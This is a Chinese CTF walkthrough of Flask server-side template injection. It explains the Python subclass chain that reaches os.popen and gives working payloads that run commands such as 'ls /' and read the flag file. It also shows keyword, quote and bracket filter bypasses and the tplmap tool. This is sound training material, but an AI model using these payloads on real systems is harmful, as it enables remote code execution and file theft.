

![img](https://peekaboo.show/content/images/2022/11/504c38662c5107b7a08c8e8a4544b479.png)



#### 0、知识点与工具

>   Flask SSTI模板注入

>   远程代码执行

>   Python中内置属性：__class__、__bases__、__subclass__、__init__、OS模块

>   工具burpsuite



#### 1、什么是SSTI模板注入

>   这东西也就是服务端模板注入攻击，将用户输入的东西作为Web的应用模板的一部分，然后进行渲染执行，从而导致敏感信息泄露或者代码执行



#### 2、Flask又是啥

>   这玩意是一个用Python编写的Web应用程序框架‌
>   ‌ 它是运行在VirtualEnv中，而这个VirtualEnv是一个虚拟的Python环境构建器

这玩意是怎么使用的，来看个小案例

‌

```c
# 首先导入这个框架
from flask import Flask
app = Flask(__name__)

# route表示网址访问url，这是/表示这里是网址的主入口
@app.route('/')
def hello_world():
	# 然后会返回一个字符串
   return 'Hello World'
   
   
   
# 改变一下让其返回一个页面
@app.route('/')
def hello_world():

# 这里就会放回hello,html页面，不过hello.html必须放在templates文件夹
# 因为render_template('hello.html')== render_template('./templates/hello.html')
   return render_template('hello.html')



# 在改变一下加入一个模板变量
@app.route('/')
def hello_world():
	
    # 定义一个变量，用于让他展示在html页面上
    str = 'Hello'
    
	# 然后会返回一个字符串
   return render_template('hello.html',str=str)
   
   # 然后就需要在hello.html中使用这个变量
   # <body>
   #	{{str}}
   # </body>
   # 然后html中就会显示这个变量的值
   
   

 # 那么要处理用户传入的参数就得这么写
@app.route('/')
def hello_world():
    id = request.args.get('id')
    return render_template('hello.html',id=id)
 

if __name__ == '__main__':
   app.run()
```



>   在html模板中,{{}}之间的内容会被当做表达式进行执行,并将结果输出到页面上

>   然后就阔以去页面上做测试了

#### 3、尝试

>   首先一进入网页的样子是这样的

>   阔以看到有一个提示，叫我们尝试以get方式传入一个name参数

‌



![img](https://peekab.oss-cn-hangzhou.aliyuncs.com/image/20221118225530.png)



>   也就是说name这可以尝试模板注入，然后可以让name的值为{{2*2}}看看是否会执行出结果





![img](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/1000000000000007.png)

‌

>   可以发现页面发生了改变，表达式被执行，如果不存在漏洞的话，页面是会显示{{2*2}}这个字符串，并不会将2*2的结果计算出来

#### 4、解题

‌



>   在Python的环境中，一般能够协助我们进行远程代码执行可能会想到system()(这里用不到)、还有OS模块(这玩意可以操作文件和目录)，但这里并不能直接使用到，所以得另辟蹊径，

-   因为Python也有对象的概念，因为object是所有类的基类，在没有指定哪个类继承哪个类的情况下，则默认继承object类
    -   然后我们可以先传入一个参数，然后通过__class__获取这个参数的基本类类型
    -   然后在通过__bases__获取这个基本类的父类,也就是object类
    -   然后在通过__subclass__()魔术方法获取object类的所有子类
    -   然后在子类中找到关于os模块的类
    -   然后在使用__init__将其初始化

```py
每个类都有的__class__,表示当前类
print(''.__class__)//获取当前对象所使用的类，此处为字符串
print(().__class__)//元组
print([].__class__)//列表
print({}.__class__)//字典



每一个类都有一个__bases__属性，列出其基类
print(''.__class__.__bases__)//base不加s输出当前父类，加s输出所有的父类(元组)

获取子类集合
print(''.__class__.__bases__[0].__subclasses__())
print(len(''.__class__.__bases__[0].__subclasses__()))//类的个数
```

‌

>   那么要进行命令执行的流程就是：获取基本类 -> 拿到基本类子类 -> 在子类中找到关于命令执行和文件读写的类，也就是os._wrap_close‌
>   ‌然后输入一些值会发现有关键字过滤，如：class、subclass、bases、init‌
>   ‌绕过的方法也很简单，使用拼接绕过即可

>   执行这面这段就阔以获取所有子类，然后子类中找到os.wrap_close的索引位置

‌

```
/?name={{1['__cl'+'ass__']['__bas'+'es__'][0]['__subcl'+'asses__']()}}
```



‌

‌



![img](https://peekab.oss-cn-hangzhou.aliyuncs.com/image/dfhdfhdshdhdfhdf.png)



‌

>   查看一下网站根目录

‌

```
?name={{''['__cla'+'ss__']['__bas'+'es__'][0]['__subcl'+'asses__']()[117]['__in'+'it__'].__globals__['popen']('ls /').read()}}
```



![img](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/1000000000000001.png)



‌



>   最总执行下面代码获取flag

‌

```
?name={{''['__cla'+'ss__']['__bas'+'es__'][0]['__subcl'+'asses__']()[117]['__in'+'it__'].__globals__['popen']('tail /fla*').read()}}
```



![img](https://peekab.oss-cn-hangzhou.aliyuncs.com/image/20221119151042.png)



### 5、扩展

-   如果flag是在配置文件中那么可以直接传入 【{{config}}】就阔以拿到

-   如果被过滤掉引号，那么可以使用http_get

    -   ```
          ?name={{().__class__.mro__.__getitem__(1).__subclasses__().__getitem__(138).__init__.__globals__.get(request.args.func)(request.args.cmd).read()}}&func=popen&cmd=dir
        ```

-   过滤掉了方括号

‌

```
原payload:
print(''.__class__.__bases__[0].__subclasses__())
print(''.__class__.__mro__[1].__subclasses__())
如果后端对[]进行了过滤
print(''.__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(138))
print(''.__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(138).__init__)
print(''.__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(138).__init__.__globals__.get('popen')('dir').read())
print(''.__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(138).__init__.__globals__.get('__builtins__').get('open')('flag.txt').read())//get()方式绕过
```

-   自动化注入

```
git clone https://github.com/epinna/tplmap.git
pip install -r requirements.txt
python tplmap.py -u
```



‌